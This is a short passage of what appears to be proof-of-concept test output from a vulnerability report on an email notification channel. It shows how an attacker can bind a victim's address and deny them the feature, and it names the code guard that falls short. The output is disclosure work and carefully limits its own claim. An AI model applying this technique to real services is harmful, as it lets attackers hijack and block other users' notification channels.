  victim retries POST /notifications/channels/email -> 200 {"message":"Verification email sent","expires_at":"2026-09-15T08:48:00.804Z","channelId":"chan-3"}
  [PASS] after the spam report the victim CAN claim their own address
         the guard at email.ts:59-72 only blocks rows in status="verified"

  => the honest claim is: binding + feature denial that persists until the victim
     receives a FURTHER ENS mail and reports it. Until the attacker triggers a
     notification, the victim gets no further mail and has nothing to report.

==============================================================================
ALL CHECKS PASSED
==============================================================================
```
